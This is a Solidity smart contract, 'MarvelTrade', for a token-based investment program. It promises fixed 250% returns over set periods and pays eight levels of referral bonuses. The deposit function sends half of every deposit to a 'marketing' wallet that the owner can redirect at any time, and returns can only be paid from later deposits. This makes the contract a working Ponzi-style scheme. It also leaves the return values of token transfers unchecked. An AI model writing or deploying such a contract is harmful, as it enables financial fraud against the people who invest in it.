//SPDX-License-Identifier: MIT
pragma solidity 0.6.0;
contract MarvelTrade {
    using SafeMath for uint256;
     IBEP20 public token;
     
    struct Tarif {
        uint256 life_days;
        uint256 percent;
        uint256 j_amt;

    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 j_time;
        uint256 dividends;
        uint256 direct_amount;
        uint256 last_payout;
        uint256 gi_bonus;
         uint256 available;
        uint256 total_invested;
        uint256 total_withdrawn;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
        mapping(uint8 => uint256) level_business;
    }

    address public owner;
    uint256[] public GI_PERCENT = [200,150,100,50, 50,100,150,200];
    uint256 public invested;
    uint256 public gi_bonus;
    uint256 public withdrawn;
    uint256 public withdrawFee;
    uint256 public releaseTime = 1598104800;//1598104800
    uint8[] public ref_bonuses; // 1 => 1%
    
    address  public marketing_wallet;
    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayoutgi(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor(IBEP20 tokenAdd, address _marketing_wallet ) public {
        owner = msg.sender;
        token = tokenAdd;
        
        marketing_wallet = _marketing_wallet;
        
        //days , total return percentage//j Amt
        tarifs.push(Tarif(1760, 250,10 * 10 ** 18));//  // 0.142% per day upto 1760 //
        tarifs.push(Tarif(875, 250,100 * 10 ** 18));// 00.2857% upto 875 days // 0.2857
        tarifs.push(Tarif(583, 250,500 * 10 ** 18));  //0.4285 % upto 583 days // 0.4285
        tarifs.push(Tarif(500, 250,1000 * 10 ** 18));  // 0.5 % % upto 500 days // // 0.5 %
        tarifs.push(Tarif(437, 250,2000 * 10 ** 18));  // 0.5714 % upto 437 // 0.5714

        tarifs.push(Tarif(389, 250, 5000 * 10 ** 18)); // 0.642 % upto 389 days // // 0.642
        tarifs.push(Tarif(350, 250, 10000 * 10 ** 18)); // 0.714 % upto 350 days // 0.714
        
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
    }

  
    function _setUpline(address _addr, address _upline,uint256 amount) private {
        if(players[_addr].upline == address(0)) {//first time entry
            if(players[_upline].deposits.length == 0) {//no deposite from my upline
                _upline = owner;
            }
            players[_addr].upline = _upline;
            for(uint8 i = 0; i < GI_PERCENT.length; i++) {
                players[_upline].structure[i]++;
                 players[_upline].level_business[i] += amount;
                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }

         else
             {
                _upline = players[_addr].upline;
            for( uint8 i = 0; i < GI_PERCENT.length; i++) {
                     players[_upline].level_business[i] += amount;
                    _upline = players[_upline].upline;
                    if(_upline == address(0) || _upline == owner ) break;
                }
        }
    }

    function deposit(uint8 _tarif, address _upline, uint256 token_quantity) external  {
        require(tarifs[_tarif].life_days > 0, "Tarif not found"); // ??
        require(token_quantity == tarifs[_tarif].j_amt, "Improper Amount"); 
        token.transferFrom(msg.sender, address(this), token_quantity);
        Player storage player = players[msg.sender];

        _setUpline(msg.sender, _upline,token_quantity);
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: token_quantity,
            totalWithdraw: 0,
            time: (uint256(block.timestamp))
        }));

        address upline  = player.upline;

        uint256 direct_amt = token_quantity.mul(5).div(100); // 5 % direct commissions
        players[upline].direct_amount += direct_amt;

        if(player.deposits.length == 0)
        {
            player.last_payout = block.timestamp;
        }

        player.available = player.available.add(token_quantity.mul(25).div(10));
        
        player.total_invested += token_quantity;
        player.j_time =  uint256(block.timestamp);
        invested += token_quantity;
      token.transfer(marketing_wallet,token_quantity.mul(50).div(100));
      
        emit NewDeposit(msg.sender, token_quantity, _tarif);
    }

    function withdraw()  external {
       
         require(
            getTimer(msg.sender) < block.timestamp,
            "withdrawal is available only once every 24 hours"
        );

        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.gi_bonus > 0, "Zero amount");
        uint256 amount = player.dividends  + player.gi_bonus + player.direct_amount;
        
          if (player.available < amount) {
            amount = player.available;
            delete player.deposits;
        }
         player.available = player.available.sub(amount);
        _send_gi(msg.sender,player.dividends);
        player.dividends = 0; 
        player.gi_bonus = 0;
        player.direct_amount = 0;
       
        player.total_withdrawn += amount;
        withdrawn += amount;
        emit Withdraw(msg.sender, amount);
        token.transfer(msg.sender,amount);
       
    }


     function getTimer(address userAddress) public view returns (uint256) {
        return players[userAddress].last_payout.add(1 days);   // 7 minutes for testing purpose 
    }


    function _send_gi(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            if(up == address(0)) break;
            uint256 bonus = _amount * GI_PERCENT[i] / 1000;
            players[up].gi_bonus += bonus;
            gi_bonus += bonus;
            up = players[up].upline;
            emit MatchPayoutgi(up, _addr, bonus);
        }
    }



    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];

                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

                if(from < to) {
                    value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                }
            }
        return value;
    }
   
    function update_mw(address _newMW) external
    {
        require(msg.sender == owner,"unauthorized call");
        marketing_wallet = _newMW;
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn,  uint256[] memory structure, uint256[] memory level_business) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

      structure = new uint256[](GI_PERCENT.length);
       level_business = new uint256[](GI_PERCENT.length);

        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            structure[i] = player.structure[i];
             level_business[i] = player.level_business[i];
        }

        return (
            payout + player.dividends ,
          
            player.total_invested,
            player.total_withdrawn,
            structure,
            level_business
        );
    }


    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn) {
        return (invested, withdrawn);
    }

   

    function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint8[] memory _ids = new uint8[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];
          Tarif storage tarif = tarifs[dep.tarif];

          _ids[i] = dep.tarif;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + tarif.life_days * 86400;
        }

        return (
          _ids,
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
    
}



library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}